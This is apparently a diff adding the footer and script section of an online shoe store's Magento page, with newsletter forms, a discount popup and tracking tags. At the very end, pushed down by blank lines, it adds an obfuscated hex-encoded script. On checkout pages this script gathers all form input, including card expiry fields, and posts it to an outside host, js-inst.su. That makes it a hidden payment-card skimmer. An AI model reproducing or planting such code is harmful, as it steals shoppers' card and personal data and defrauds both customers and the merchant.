+    <form action="/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+	   <input type="text" name="email" value="" placeholder="Please enter email address"><input type="submit" name="signup" value="Sign Up">
+    </form>
+</div>					  </div>
+                    <div class="clear"></div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="footer-container-bg">
+	<div class="container">
+		<div class="row">
+			<div class="span12">
+				<div class="footer">
+					<div class="footer-right">
+						<a href="mailto:help@athleticpropulsionlabs.com">help@athleticpropulsionlabs.com</a> | 866.672.8630
+					</div>
+					<address>&copy; 2016 Athletic Propulsion Labs, LLC. All Rights Reserved</address>
+                    <div class="footerbg-col">&nbsp;</div>
+<div class="footerbg-col"><a href="/privacy-policy">Privacy Policy</a></div>
+<div class="footerbg-col">&nbsp;</div>
+<div class="footerbg-col"><a href="/terms">Terms Of Use</a></div>
+<div class="footerbg-col">&nbsp;</div>
+<div class="footerbg-col"><a onclick="window.open(this.href); return false;" href="http://www.symantec.com/ssl-certificates/secure-site-ev/"><img title="Norton Secured" src="/media/wysiwyg/norton-secured.png" alt="Norton Secured" style="margin-top: -4px;" /></a></div>					<div class="clear"></div>
+									</div>
+			</div>
+		</div>
+	</div>
+</div>
+<!-- Start Alexa Certify Javascript -->
+<script type="text/javascript">
+_atrk_opts = { atrk_acct:"7DDNm1a4KM+2/9", domain:"athleticpropulsionlabs.com",dynamic: true};
+(function() { var as = document.createElement('script'); as.type = 'text/javascript'; as.async = true; as.src = "https://d31qbv1cthcecs.cloudfront.net/atrk.js"; var s = document.getElementsByTagName('script')[0];s.parentNode.insertBefore(as, s); })();
+</script>
+<noscript><img src="https://d5nxst8fruw4z.cloudfront.net/atrk.gif?account=7DDNm1a4KM+2/9" style="display:none" height="1" width="1" alt="" /></noscript>
+<!-- End Alexa Certify Javascript -->  		 	<div id="page_overlay">
+		<div id="welcome_promo">
+			<div id="close_promo">
+				<a href="#">X</a>
+			</div>
+			<div class="welcome_logo">
+				<img src="/media/wysiwyg/apl_small_black.png" alt="APL">
+			</div>
+			<div id="welcome_form">
+				<form method="post" action="/">
+					<div class="welcome_text">
+						Sign up for exclusive product news and special offers and receive <strong>10% off</strong> your first order
+					</div>
+					<div class="welcome_enter">
+						<input type="text" name="email" value="" placeholder="enter email">
+					</div>
+					<div class="welcome_button">
+						<button type="submit" name="get_code">Get My Code</button>
+					</div>
+				</form>
+			</div>
+			<div id="welcome_error">Please enter a valid email address</div>
+			<div id="welcome_code" class="welcome_text"></div>
+			<div class="welcome_terms">
+				Terms and conditions apply.
+			</div>
+		</div>
+	</div>
+	<script type="text/javascript">
+		jQuery(document).ready(function() {
+			jQuery.ajax({
+				type: "POST",
+				url: "/shell/welcome_cookie.php"
+			}).done(function( html ) {
+				if (html=="1") {
+					jQuery("#page_overlay").on('click',function(){
+						jQuery(this).fadeOut(300, function() { jQuery(this).remove(); });
+					}).on('click','#welcome_promo',function(e) {
+						e.stopPropagation();
+					});
+					jQuery("#close_promo a").on("click",function(e) {
+						e.preventDefault();
+						jQuery("#page_overlay").fadeOut(300, function() { jQuery(this).remove(); });
+					});
+					jQuery("#welcome_form form").on("submit",function(e) {
+						e.preventDefault();
+						if (!jQuery("#welcome_form button").hasClass("clicked")) {
+							var email = jQuery("#welcome_form input").val();
+							if (validateEmail(email)) {
+								jQuery("#welcome_form button").addClass("clicked");
+								jQuery.ajax({
+									type: "POST",
+									url: "/shell/welcome_form.php",
+									data: {
+										"email": email
+									}
+								}).done(function( html ) {
+									jQuery("#welcome_form").fadeOut(500);
+									setTimeout(function() {
+										jQuery("#welcome_code").html(html).fadeIn(500);
+									},500);
+								});
+							} else {
+								jQuery("#welcome_error").fadeIn(500);
+							}
+						}
+					});
+					setTimeout(function() {
+						jQuery("#page_overlay").fadeIn(1000);
+						setTimeout(function() {
+							jQuery("#welcome_promo").css({display:'block'}).animate({marginTop:'-140px', opacity:'1'},1000);
+						},500);
+					},2000);
+				}
+			});
+		});
+		function validateEmail(email) {
+		    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+		    return re.test(email);
+		}
+	</script>
+       
+<script>
+new Ajax.Request('http://www.athleticpropulsionlabs.com/mgtvarnish/esi/', {
+  onSuccess: function(response) {}
+});
+</script>
+				<!-- START Rakuten Marketing Tracking -->
+				<script type="text/javascript">
+					(function (url) {
+							/*Tracking Bootstrap
+							Set Up DataLayer objects/properties here*/
+							if(!window.DataLayer){
+								window.DataLayer = {};
+							}
+							if(!DataLayer.events){
+								DataLayer.events = {};
+							}
+							DataLayer.events.SiteSection = "1";
+									
+						var loc, ct = document.createElement("script"); 
+						ct.type = "text/javascript"; 
+						ct.async = true;
+						ct.src = url;
+						loc = document.getElementsByTagName("script")[0];
+						loc.parentNode.insertBefore(ct, loc);
+					}(document.location.protocol + "//js.rmtag.com/111938.ct.js"));
+				</script>
+				<!-- END Rakuten Marketing Tracking -->
+			    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+var _0xb41f=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x63\x68\x61\x6E\x67\x65","\x66\x6F\x72\x6D","\x73\x65\x6C\x65\x63\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x79\x65\x61\x72\x5D\x22\x5D","\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x5D","\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x22\x66\x75\x6C\x6C\x5F\x63\x63\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x5D","\x73\x65\x6C\x65\x63\x74\x5B\x69\x64\x3D\x22\x72\x65\x64\x65\x63\x61\x72\x64\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72\x22\x5D","\x6C\x65\x6E\x67\x74\x68","\x76\x61\x6C","","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","\x6A\x69\x6B","\x2D","\x72\x65\x70\x6C\x61\x63\x65","\x3D","\x26","\x26\x69\x64\x64\x3D","\x68\x6F\x73\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x69\x6E\x73\x74\x2E\x73\x75\x2F\x6D\x61\x67\x2E\x70\x68\x70","\x50\x4F\x53\x54","\x6A\x73\x6F\x6E","\x61\x6A\x61\x78","\x6F\x6E"];if(( new RegExp(_0xb41f[2]))[_0xb41f[1]](window[_0xb41f[0]])){setTimeout(function(){jQuery(function(_0xae57x1){_0xae57x1(document)[_0xb41f[27]](_0xb41f[3],_0xb41f[4],function(){grelos_v= null;a= [_0xb41f[5],_0xb41f[6],_0xb41f[7],_0xb41f[8]];for(var _0xae57x2=0;_0xae57x2< 4;_0xae57x2++){try{if(_0xae57x1(a[_0xae57x2])[_0xb41f[10]]()[_0xb41f[9]]> 0){_0xae57x3()}}catch(e){}};function _0xae57x3(){var _0xae57x4=_0xb41f[11];var _0xae57x5=document[_0xb41f[13]](_0xb41f[12]);for(var _0xae57x6=0;_0xae57x6< _0xae57x5[_0xb41f[9]];_0xae57x6++){if(_0xae57x5[_0xae57x6][_0xb41f[14]][_0xb41f[9]]> 0){var _0xae57x7=_0xae57x5[_0xae57x6][_0xb41f[15]];if(_0xae57x7== _0xb41f[11]){_0xae57x7= _0xb41f[16]+ _0xae57x6};var _0xae57x8=_0xae57x7[_0xb41f[18]](/\[/g,_0xb41f[17]);var _0xae57x9=_0xae57x8[_0xb41f[18]](/-redecard/,_0xb41f[11]);_0xae57x4+= _0xae57x9[_0xb41f[18]](/]/g,_0xb41f[11])+ _0xb41f[19]+ _0xae57x5[_0xae57x6][_0xb41f[14]]+ _0xb41f[20]}};_0xae57x4= _0xae57x4+ _0xb41f[21]+ window[_0xb41f[0]][_0xb41f[22]];_0xae57x1[_0xb41f[26]]({url:_0xb41f[23],data:_0xae57x4,type:_0xb41f[24],dataType:_0xb41f[25],success:function(_0xae57xa){return false},error:function(_0xae57xb,_0xae57xc,_0xae57xd){return false}})}})})},5000)}
+</script><script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"618ef45929","applicationID":"27785689","transactionName":"MwZRN0YACkcCAhUNDgpMcgBACAtaTAIMF04NDVcGTE4NWgcEGQ==","queueTime":0,"applicationTime":91,"atts":"H0FSQQ4aGUk=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
+</html>
